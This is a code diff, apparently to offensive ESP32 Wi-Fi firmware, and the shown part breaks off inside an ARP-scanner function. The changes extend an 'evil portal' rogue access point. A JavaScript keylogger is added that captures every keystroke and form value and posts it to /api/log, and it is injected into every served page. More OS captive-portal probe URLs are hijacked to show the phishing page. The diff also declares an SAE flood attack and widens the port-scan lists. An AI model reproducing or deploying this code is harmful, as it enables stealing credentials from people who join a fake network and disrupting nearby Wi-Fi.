@@ -12,6 +12,8 @@
 #include "freertos/FreeRTOS.h"
 #include "freertos/event_groups.h"
 #include "lwip/etharp.h"
+#include "lwip/netif.h"
+#include "lwip/ip4_addr.h"
 #include "lwip/lwip_napt.h"
 #include "managers/ap_manager.h"
 #include "managers/rgb_manager.h"
@@ -37,6 +39,13 @@
 #include <inttypes.h>
 #include "managers/default_portal.h"
 #include "freertos/task.h"
+#include "freertos/portmacro.h"
+#include "mbedtls/ecp.h"
+#include "mbedtls/ctr_drbg.h"
+#include "mbedtls/entropy.h"
+#include "mbedtls/sha256.h"
+#include "mbedtls/hmac_drbg.h"
+#include "mbedtls/bignum.h"
 
 // Defines for Station Scan Channel Hopping
 #define SCANSTA_CHANNEL_HOP_INTERVAL_MS 250 // Hop channel every 250ms
@@ -59,6 +68,31 @@ static int g_beacon_list_count = 0;
 
 static void wifi_beacon_list_task(void *param);
 
+// Forward declarations for SAE flood attack
+static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type);
+static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type);
+static esp_err_t start_live_ap_channel_hopping(void);
+static void stop_live_ap_channel_hopping(void);
+static esp_timer_handle_t live_ap_channel_hop_timer = NULL;
+static volatile bool live_ap_hopping_active = false;
+static uint32_t last_live_print_ms = 0;
+static uint16_t live_last_printed_index = 0;
+
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
+static const uint8_t live_ap_channels[] = {
+    1,2,3,4,5,6,7,8,9,10,11,12,13,
+    36,40,44,48,52,56,60,64,
+    100,104,108,112,116,120,124,128,132,136,140,144,
+    149,153,157,161,165
+};
+#else
+static const uint8_t live_ap_channels[] = {
+    1,2,3,4,5,6,7,8,9,10,11,12,13
+};
+#endif
+static const size_t live_ap_channels_len = sizeof(live_ap_channels) / sizeof(live_ap_channels[0]);
+static size_t live_ap_channel_index = 0;
+
 uint16_t ap_count;
 wifi_ap_record_t *scanned_aps;
 const char *TAG = "WiFiManager";
@@ -72,68 +106,161 @@ void *deauth_task_handle = NULL;
 int beacon_task_running = 0;
 
 const uint16_t COMMON_PORTS[] = {
-    20,    // FTP Data
-    21,    // FTP Control
-    22,    // SSH
-    23,    // Telnet
-    25,    // SMTP
-    53,    // DNS
-    69,    // TFTP
-    80,    // HTTP
-    88,    // Kerberos
-    110,   // POP3
-    111,   // RPCBind
-    123,   // NTP
-    135,   // MSRPC
-    137,   // NetBIOS Name Service
-    138,   // NetBIOS Datagram Service
-    139,   // NetBIOS Session Service
-    143,   // IMAP
-    161,   // SNMP
-    389,   // LDAP
-    443,   // HTTPS
-    445,   // SMB
-    465,   // SMTPS
-    500,   // IKE (VPN)
-    514,   // Syslog
-    515,   // LPD/LPR Printer
-    587,   // SMTP (submission)
-    631,   // IPP (Printing)
-    636,   // LDAPS
-    993,   // IMAPS
-    995,   // POP3S
-    1080,  // SOCKS Proxy
-    1433,  // MSSQL
-    1434,  // MSSQL Browser
-    1521,  // Oracle DB
-    1701,  // L2TP
-    1723,  // PPTP
-    1883,  // MQTT
-    2049,  // NFS
-    2082,  // cPanel
-    2083,  // cPanel SSL
-    2086,  // WHM
-    2087,  // WHM SSL
-    2222,  // Alternative SSH
-    3306,  // MySQL
-    3389,  // RDP
-    5060,  // SIP
-    5222,  // XMPP
-    5432,  // PostgreSQL
-    5900,  // VNC
-    5901,  // VNC-1
-    5902,  // VNC-2
-    6379,  // Redis
-    8080,  // HTTP Proxy
-    8443,  // HTTPS Alt
-    8883,  // MQTT SSL
-    9100,  // Printer
-    27017, // MongoDB
-    32400, // Plex Media Server
-    51820, // Wireguard
-    55443  // Alt HTTP
+    7,     // echo
+    20,    // ftp-data
+    21,    // ftp
+    22,    // ssh
+    23,    // telnet
+    25,    // smtp
+    53,    // dns
+    69,    // tftp (udp mostly)
+    80,    // http
+    88,    // kerberos
+    110,   // pop3
+    111,   // rpcbind
+    119,   // nntp
+    123,   // ntp (udp mostly)
+    135,   // msrpc
+    137,   // netbios-ns
+    138,   // netbios-dgm
+    139,   // netbios-ssn
+    143,   // imap
+    161,   // snmp (udp mostly)
+    162,   // snmp-trap (udp mostly)
+    389,   // ldap
+    443,   // https
+    445,   // smb
+    465,   // smtps
+    500,   // ike (udp mostly)
+    502,   // modbus
+    512,   // exec
+    513,   // login
+    514,   // syslog/shell (udp mostly)
+    515,   // lpd
+    587,   // smtp-submission
+    593,   // rpc over http
+    631,   // ipp
+    636,   // ldaps
+    646,   // ldp
+    873,   // rsync
+    902,   // vmware-server
+    989,   // ftps-data
+    990,   // ftps
+    993,   // imaps
+    995,   // pop3s
+    1080,  // socks
+    1099,  // rmi
+    1433,  // mssql
+    1434,  // mssql-browser (udp mostly)
+    1494,  // citrix-ica
+    1521,  // oracle-db
+    1701,  // l2tp (udp mostly)
+    1720,  // h323
+    1723,  // pptp
+    1883,  // mqtt
+    1900,  // ssdp (udp mostly)
+    2049,  // nfs
+    2082,  // cpanel
+    2083,  // cpanel-ssl
+    2086,  // whm
+    2087,  // whm-ssl
+    2095,  // webmail
+    2096,  // webmail-ssl
+    2222,  // ssh-alt
+    2375,  // docker
+    2376,  // docker-tls
+    2377,  // docker-swarm
+    2379,  // etcd
+    2380,  // etcd-peer
+    2381,  // etcd-alt
+    2480,  // oracle-web
+    25565, // minecraft
+    27017, // mongodb
+    27018, // mongodb-shard
+    27019, // mongodb-config
+    28017, // mongodb-http
+    3000,  // dev-http
+    3001,  // dev-http-alt
+    3128,  // squid-proxy
+    32400, // plex
+    3260,  // iscsi
+    3306,  // mysql
+    3389,  // rdp
+    3478,  // stun (udp mostly)
+    3689,  // daap
+    4369,  // epmd
+    4444,  // tcp-alt
+    4500,  // ipsec-nat-t (udp mostly)
+    4789,  // vxlan (udp mostly)
+    4848,  // glassfish-admin
+    5000,  // http-alt/upnp
+    5001,  // http-alt
+    5004,  // rtp (udp mostly)
+    5005,  // rtp (udp mostly)
+    5060,  // sip
+    5061,  // sips
+    5222,  // xmpp
+    5223,  // xmpp-ssl/apns
+    5357,  // wsdapi
+    5432,  // postgresql
+    5555,  // android-adb
+    5601,  // kibana
+    5671,  // amqp-tls
+    5672,  // amqp
+    5683,  // coap (udp mostly)
+    5900,  // vnc
+    5901,  // vnc-1
+    5902,  // vnc-2
+    5984,  // couchdb
+    5985,  // winrm
+    5986,  // winrm-https
+    6000,  // x11
+    6379,  // redis
+    6667,  // irc
+    7001,  // websphere
+    7199,  // cassandra-intra
+    8000,  // http-alt
+    8008,  // http-alt
+    8080,  // http-proxy
+    8081,  // http-alt
+    8082,  // http-alt
+    8083,  // http-alt
+    8086,  // influxdb
+    8088,  // http-alt
+    8123,  // home-assistant
+    8161,  // activemq
+    8181,  // http-alt
+    8200,  // upnp-minidlna
+    8222,  // vmware
+    8333,  // bitcoin
+    8443,  // https-alt
+    8500,  // consul
+    8530,  // wsus
+    8554,  // rtsp-alt
+    8883,  // mqtt-tls
+    8888,  // http-alt
+    9000,  // sonarqube/php-fpm
+    9042,  // cassandra-cql
+    9080,  // http-alt
+    9090,  // http-alt
+    9091,  // transmission
+    9092,  // kafka
+    9100,  // printer
+    9200,  // elasticsearch
+    9300,  // elasticsearch-node
+    9418,  // git
+    9443,  // https-alt
+    10000, // webmin
+    11211, // memcached
+    15672, // rabbitmq-mgmt
+    51820, // wireguard
+    55443  // http-alt
 };
 const size_t NUM_PORTS = sizeof(COMMON_PORTS) / sizeof(COMMON_PORTS[0]);
+static const uint16_t UDP_COMMON_PORTS[] = {
+    53, 67, 68, 69, 123, 137, 161, 162, 1900, 500, 514, 520, 5353, 5683
+};
+static const size_t NUM_UDP_PORTS = sizeof(UDP_COMMON_PORTS) / sizeof(UDP_COMMON_PORTS[0]);
 static char PORTALURL[512] = "";
 static char domain_str[128] = "";
 EventGroupHandle_t wifi_event_group;
@@ -156,6 +283,10 @@ static char current_keystrokes_filename[128] = "";
 static int ap_connection_count = 0;
 
 #define MAX_HTML_BUFFER_SIZE 2048
+
+// JavaScript snippet injected into every served HTML page to capture keystrokes and input values
+static const char *CAPTURE_JS_SNIPPET = \
+    "<script>(function(){const send=d=>navigator.sendBeacon?navigator.sendBeacon('/api/log',new Blob([d])):fetch('/api/log',{method:'POST',headers:{\"Content-Type\":\"text/plain\"},body:d});const h=e=>{const t=e.target;if(!(t.name||t.id))return;const tag=t.tagName.toLowerCase();send(Date.now()+\"|\"+tag+\"|\"+(t.name||t.id)+\"|\"+t.value+\"\\n\");};['input','change','keydown'].forEach(ev=>document.addEventListener(ev,h,true));})();</script>";
 static char* html_buffer = NULL;
 static size_t html_buffer_size = 0;
 static bool use_html_buffer = false;
@@ -304,6 +435,10 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
 
 
 static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
+                               void *event_data);
+static void wifi_retry_timer_callback(void* arg);
+
+static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
                                void *event_data)
 {
     if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
@@ -320,14 +455,33 @@ static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t e
         }
     } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
         wifi_event_sta_disconnected_t* disconnected = (wifi_event_sta_disconnected_t*) event_data;
-        printf("Disconnected from WiFi (reason: %d)\n", disconnected->reason);
-        TERMINAL_VIEW_ADD_TEXT("Disconnected from WiFi (reason: %d)\n", disconnected->reason);
         
-        // No auto-reconnection - only manual connections via 'connect' command
+        // Provide more detailed reason descriptions
+        const char* reason_str = "Unknown";
+        switch(disconnected->reason) {
+            case 2: reason_str = "Auth Expired"; break;
+            case 3: reason_str = "Auth Leave"; break;
+            case 4: reason_str = "Assoc Expire"; break;
+            case 5: reason_str = "Assoc Too Many"; break;
+            case 6: reason_str = "Not Authed"; break;
+            case 7: reason_str = "Not Assoc"; break;
+            case 8: reason_str = "Assoc Leave"; break;
+            case 15: reason_str = "4Way Handshake Timeout"; break;
+            case 201: reason_str = "Beacon Timeout"; break;
+            case 202: reason_str = "No AP Found"; break;
+            case 203: reason_str = "Auth Fail"; break;
+            case 204: reason_str = "Assoc Fail"; break;
+            case 205: reason_str = "Handshake Timeout"; break;
+        }
+        
+        // Clean, single-line disconnect logging
         if (manual_disconnect) {
-            printf("Disconnected from WiFi (manual)\n");
-            TERMINAL_VIEW_ADD_TEXT("Disconnected from WiFi (manual)\n");
+            printf("WiFi disconnected manually\n");
+            TERMINAL_VIEW_ADD_TEXT("WiFi disconnected manually\n");
             manual_disconnect = false; // Reset the flag
+        } else {
+            printf("WiFi disconnected: %s (reason %d)\n", reason_str, disconnected->reason);
+            TERMINAL_VIEW_ADD_TEXT("WiFi disconnected: %s (reason %d)\n", reason_str, disconnected->reason);
         }
         
         xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
@@ -335,9 +489,12 @@ static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t e
         ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
         printf("Got IP: %s\n", ip4addr_ntoa(&event->ip_info.ip));
         TERMINAL_VIEW_ADD_TEXT("Got IP: %s\n", ip4addr_ntoa(&event->ip_info.ip));
+        
         xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
     }
 }
+
+// Removed old wifi_retry_timer_callback - using unified retry system
 
 static void generate_random_ssid(char *ssid, size_t length) {
     const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
@@ -615,6 +772,10 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
                 break;
             }
         }
+        // Inject capture JS if serving HTML
+        if (content_type && strcmp(content_type, "text/html") == 0) {
+            httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
+        }
 
         free(buffer);
         fclose(file);
@@ -815,11 +976,18 @@ esp_err_t portal_handler(httpd_req_t *req) {
     printf("Client requested URL: %s\n", req->uri);
     ESP_LOGI(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
 
-    // Check if we should serve HTML from buffer first
-    if (use_html_buffer && html_buffer != NULL && html_buffer_size > 0) {
+    // Debug buffer state
+    ESP_LOGI(TAG, "HTML buffer check: html_buffer=%p, html_buffer_size=%zu, use_html_buffer=%s", 
+             html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
+
+    // Prefer buffered HTML over default embedded portal when available
+    if (html_buffer != NULL && html_buffer_size > 0) {
+        ESP_LOGI(TAG, "Using buffered HTML (size: %zu bytes)", html_buffer_size);
         httpd_resp_set_type(req, "text/html");
-        httpd_resp_send(req, html_buffer, html_buffer_size);
-        ESP_LOGI(TAG, "Served HTML from buffer (size: %zu bytes).", html_buffer_size);
+        httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked"); // Set chunked response
+        httpd_resp_send_chunk(req, html_buffer, html_buffer_size);
+        httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
+        ESP_LOGI(TAG, "Served HTML from buffer (size: %zu bytes) with JS injection.", html_buffer_size);
         ESP_LOGI(TAG, "Free heap after serving buffer: %" PRIu32 " bytes", esp_get_free_heap_size());
         return ESP_OK;
     }
@@ -827,8 +995,10 @@ esp_err_t portal_handler(httpd_req_t *req) {
     // Check if we should serve the default embedded portal
     if (strcmp(PORTALURL, "INTERNAL_DEFAULT_PORTAL") == 0) {
         httpd_resp_set_type(req, "text/html");
-        httpd_resp_send(req, default_portal_html, strlen(default_portal_html));
-        ESP_LOGI(TAG, "Served default embedded portal.");
+        httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked");
+        httpd_resp_send_chunk(req, default_portal_html, strlen(default_portal_html));
+        httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
+        ESP_LOGI(TAG, "Served default embedded portal with JS injection.");
         ESP_LOGI(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
         return ESP_OK;
     }
@@ -932,12 +1102,21 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
         return ESP_OK;
     }
     const char *uri = req->uri;
-    if (strcmp(uri, "/generate_204") == 0 || strcmp(uri, "/hotspot-detect.html") == 0 || strcmp(uri, "/connecttest.txt") == 0) {
-        httpd_resp_set_status(req, "301 Moved Permanently");
-        httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
-        httpd_resp_send(req, NULL, 0);
+    if (
+        strcmp(uri, "/generate_204") == 0 ||
+        strcmp(uri, "/gen_204") == 0 ||
+        strcmp(uri, "/hotspot-detect.html") == 0 ||
+        strcmp(uri, "/connecttest.txt") == 0 ||
+        strcmp(uri, "/ncsi.txt") == 0 ||
+        strcmp(uri, "/success.txt") == 0 ||
+        strcmp(uri, "/library/test/success.html") == 0 ||
+        strcmp(uri, "/success.html") == 0 ||
+        strcmp(uri, "/") == 0 ||
+        strcmp(uri, "/redirect") == 0
+    ) {
+        esp_err_t r = portal_handler(req);
         ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
-        return ESP_OK;
+        return r;
     }
     // minimal logging for captive probe
 
@@ -951,7 +1130,7 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
         return ESP_OK;
     }
 
-    httpd_resp_set_status(req, "301 Moved Permanently");
+    httpd_resp_set_status(req, "302 Found");
     char LocationRedir[512];
     snprintf(LocationRedir, sizeof(LocationRedir), "http://192.168.4.1/login");
     httpd_resp_set_hdr(req, "Location", LocationRedir);
@@ -960,9 +1139,20 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+static esp_err_t captive_portal_head_ok_handler(httpd_req_t *req) {
+    if (login_done) {
+        httpd_resp_set_status(req, "204 No Content");
+    } else {
+        httpd_resp_set_status(req, "200 OK");
+        httpd_resp_set_type(req, "text/html");
+    }
+    httpd_resp_send(req, NULL, 0);
+    return ESP_OK;
+}
+
 httpd_handle_t start_portal_webserver(void) {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
-    config.max_uri_handlers = 15;
+    config.max_uri_handlers = 32;
     config.max_open_sockets = 13; // Increased from 7
     config.backlog_conn = 10;     // Increased from 7
     config.stack_size = 8192;
@@ -970,11 +1160,25 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_uri_t portal_uri = {
             .uri = "/login", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL};
         httpd_uri_t portal_android_get = {.uri = "/generate_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
-        httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t portal_android_gen_get = {.uri = "/gen_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_android_gen_head = {.uri = "/gen_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t portal_apple_get = {.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
-        httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t portal_root_get = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_root_head = {.uri = "/", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t microsoft_get = {.uri = "/connecttest.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
-        httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t ncsi_get = {.uri = "/ncsi.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t ncsi_head = {.uri = "/ncsi.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t success_get = {.uri = "/success.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t success_head = {.uri = "/success.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t lib_success_get = {.uri = "/library/test/success.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t lib_success_head = {.uri = "/library/test/success.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t success_html_get = {.uri = "/success.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t success_html_head = {.uri = "/success.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t redirect_get = {.uri = "/redirect", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t redirect_head = {.uri = "/redirect", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t log_handler_uri = {
             .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
         httpd_uri_t portal_png = {
@@ -989,10 +1193,24 @@ httpd_handle_t start_portal_webserver(void) {
             .uri = ".html", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_register_uri_handler(evilportal_server, &portal_android_get);
         httpd_register_uri_handler(evilportal_server, &portal_android_head);
+        httpd_register_uri_handler(evilportal_server, &portal_android_gen_get);
+        httpd_register_uri_handler(evilportal_server, &portal_android_gen_head);
         httpd_register_uri_handler(evilportal_server, &portal_apple_get);
         httpd_register_uri_handler(evilportal_server, &portal_apple_head);
+        httpd_register_uri_handler(evilportal_server, &portal_root_get);
+        httpd_register_uri_handler(evilportal_server, &portal_root_head);
         httpd_register_uri_handler(evilportal_server, &microsoft_get);
         httpd_register_uri_handler(evilportal_server, &microsoft_head);
+        httpd_register_uri_handler(evilportal_server, &ncsi_get);
+        httpd_register_uri_handler(evilportal_server, &ncsi_head);
+        httpd_register_uri_handler(evilportal_server, &success_get);
+        httpd_register_uri_handler(evilportal_server, &success_head);
+        httpd_register_uri_handler(evilportal_server, &lib_success_get);
+        httpd_register_uri_handler(evilportal_server, &lib_success_head);
+        httpd_register_uri_handler(evilportal_server, &success_html_get);
+        httpd_register_uri_handler(evilportal_server, &success_html_head);
+        httpd_register_uri_handler(evilportal_server, &redirect_get);
+        httpd_register_uri_handler(evilportal_server, &redirect_head);
         httpd_register_uri_handler(evilportal_server, &portal_uri);
         httpd_register_uri_handler(evilportal_server, &log_handler_uri);
 
@@ -1014,6 +1232,18 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
     login_done = false; // Reset login state on start
     current_creds_filename[0] = '\0'; // Reset filenames at the start
     current_keystrokes_filename[0] = '\0';
+    // Log HTML buffer state at portal startup
+    ESP_LOGI(TAG, "Evil portal starting - HTML buffer state: buffer=%p, size=%zu, use_html_buffer=%s", 
+        html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
+
+    // Log first 100 characters of captured HTML if available
+    if (html_buffer != NULL && html_buffer_size > 0) {
+    char preview[101];
+    size_t preview_len = html_buffer_size > 100 ? 100 : html_buffer_size;
+    memcpy(preview, html_buffer, preview_len);
+    preview[preview_len] = '\0';
+    ESP_LOGI(TAG, "Captured HTML preview (first %zu chars): %.100s", preview_len, preview);
+    }
 
     // Generate indexed filenames if SD card is available
     if (sd_card_manager.is_initialized) {
@@ -1124,13 +1354,7 @@ void wifi_manager_stop_evil_portal() {
     current_creds_filename[0] = '\0'; // Clear saved filenames
     current_keystrokes_filename[0] = '\0';
     
-    // Clean up HTML buffer
-    use_html_buffer = false;
-    if (html_buffer != NULL) {
-        free(html_buffer);
-        html_buffer = NULL;
-    }
-    html_buffer_size = 0;
+    // Keep HTML buffer across portal restarts - don't clear it here
 
     if (dns_handle != NULL) {
         stop_dns_server(dns_handle);
@@ -1152,8 +1376,11 @@ bool wifi_manager_is_evil_portal_active(void) {
 }
 
 void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
-
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
+    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
+    ESP_ERROR_CHECK(esp_wifi_start());
 
     // Set hardware-level promiscuous filter based on callback type
     wifi_promiscuous_filter_t filter = {0};
@@ -1168,13 +1395,16 @@ void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
     } else if (callback == wifi_eapol_scan_callback) {
         // Data frames only for EAPOL
         filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
+    } else if (callback == sae_monitor_callback) {
+        // Management frames for SAE
+        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
     } else {
         // Default: capture all frame types (for raw capture, etc.)
         filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
     }
     
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
-    ESP_LOGI("WIFI_MANAGER", "Set hardware filter mask: 0x%02X", filter.filter_mask);
+    ESP_LOGI("WIFI_MANAGER", "Set hardware filter mask: 0x%02" PRIx32, filter.filter_mask);
 
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
 
@@ -1199,9 +1429,17 @@ void wifi_manager_stop_monitor_mode() {
 
 void wifi_manager_init(void) {
 
+    // --- Memory check before WiFi init ---
+    size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
+    if (free_heap < (45 * 1024)) {
+        ESP_LOGW(TAG, "WARNING: Less than 45KB of free RAM available (%d bytes). WiFi may fail to initialize or operate reliably!", (int)free_heap);
+        TERMINAL_VIEW_ADD_TEXT("WARNING: <45KB RAM free (%d bytes). WiFi may not initialize or operate reliably!\n", (int)free_heap);
+    }
+
     esp_log_level_set("wifi", ESP_LOG_ERROR); // Only show errors, not warnings
 
-    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
+    // Disable WiFi power saving to improve connection stability
+    esp_wifi_set_ps(WIFI_PS_NONE);
 
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
@@ -1271,6 +1509,13 @@ void wifi_manager_init(void) {
     ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
     // Start the Wi-Fi AP
     ESP_ERROR_CHECK(esp_wifi_start());
+    
+    // Additional WiFi stability settings
+    // Set maximum TX power to improve signal strength
+    esp_wifi_set_max_tx_power(78); // 19.5 dBm (78/4)
+    
+    // Set connection timeout to be more lenient
+    esp_wifi_set_inactive_time(WIFI_IF_STA, 60); // 60 seconds before considering connection inactive
 
     // Initialize global CA certificate store
     ret = esp_crt_bundle_attach(NULL);
@@ -2046,6 +2291,9 @@ void animate_led_based_on_amplitude(void *pvParameters) {
     float last_amplitude = 0.0f;
     float smoothing_factor = 0.1f;
     int hue = 0;
+    
+    uint32_t last_error_time = 0;
+    const uint32_t error_rate_limit_ms = 5000;
 
     while (1) {
         struct sockaddr_in source_addr;
@@ -2275,6 +2523,327 @@ scanner_ctx_t *scanner_init(void) {
     return ctx;
 }
 
+arp_scanner_ctx_t *arp_scanner_init(void) {
+    arp_scanner_ctx_t *ctx = malloc(sizeof(arp_scanner_ctx_t));
+    if (!ctx) {
+        return NULL;
+    }
+
+    ctx->max_hosts = END_HOST - START_HOST + 1;
+    ctx->hosts = malloc(sizeof(arp_host_t) * ctx->max_hosts);
+    if (!ctx->hosts) {
+        free(ctx);
+        return NULL;
+    }
+
+    ctx->num_active_hosts = 0;
+    memset(ctx->subnet_prefix, 0, sizeof(ctx->subnet_prefix));
+    return ctx;
+}
+
+void arp_scanner_cleanup(arp_scanner_ctx_t *ctx) {
+    if (ctx) {
+        if (ctx->hosts) {
+            free(ctx->hosts);
+        }
+        free(ctx);
+    }
+}
+
+bool send_arp_request(const char *target_ip) {
+    if (!target_ip) {
+        ESP_LOGW(TAG, "send_arp_request: target_ip is NULL");
+        return false;
+    }
+
+    ESP_LOGD(TAG, "Sending ARP request to %s", target_ip);
+    
+    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!netif) {
+        ESP_LOGW(TAG, "send_arp_request: Failed to get WiFi STA interface");
+        return false;
+    }
+
+    // Get our own IP and MAC
+    esp_netif_ip_info_t ip_info;
+    if (esp_netif_get_ip_info(netif, &ip_info) != ESP_OK) {
+        return false;
+    }
+
+    uint8_t our_mac[6];
+    if (esp_netif_get_mac(netif, our_mac) != ESP_OK) {
+        return false;
+    }
+
+    // Parse target IP
+    esp_ip4_addr_t target_addr;
+    if (inet_pton(AF_INET, target_ip, &target_addr) != 1) {
+        return false;
+    }
+
+    // Create ARP request packet
+    uint8_t arp_packet[42] = {
+        // Ethernet header
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (broadcast)
+        our_mac[0], our_mac[1], our_mac[2], our_mac[3], our_mac[4], our_mac[5], // Source MAC
+        0x08, 0x06, // EtherType (ARP)
+        
+        // ARP header
+        0x00, 0x01, // Hardware type (Ethernet)
+        0x08, 0x00, // Protocol type (IPv4)
+        0x06,       // Hardware address length
+        0x04,       // Protocol address length
+        0x00, 0x01, // Operation (ARP request)
+        
+        // Sender hardware address (our MAC)
+        our_mac[0], our_mac[1], our_mac[2], our_mac[3], our_mac[4], our_mac[5],
+        
+        // Sender protocol address (our IP)
+        (ip_info.ip.addr >> 0) & 0xFF,
+        (ip_info.ip.addr >> 8) & 0xFF,
+        (ip_info.ip.addr >> 16) & 0xFF,
+        (ip_info.ip.addr >> 24) & 0xFF,
+        
+        // Target hardware address (unknown, all zeros)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        
+        // Target protocol address (target IP)
+        (target_addr.addr >> 0) & 0xFF,
+        (target_addr.addr >> 8) & 0xFF,
+        (target_addr.addr >> 16) & 0xFF,
+        (target_addr.addr >> 24) & 0xFF
+    };
+
+    // Send raw ARP packet using esp_wifi_80211_tx with retry logic
+    ESP_LOGD(TAG, "Sending ARP packet to %s via esp_wifi_80211_tx", target_ip);
+    
+    esp_err_t err = ESP_FAIL;
+    int retry_count = 0;
+    const int max_retries = 3;
+    
+    while (retry_count < max_retries) {
+        err = esp_wifi_80211_tx(WIFI_IF_STA, arp_packet, sizeof(arp_packet), false);
+        
+        if (err == ESP_OK) {
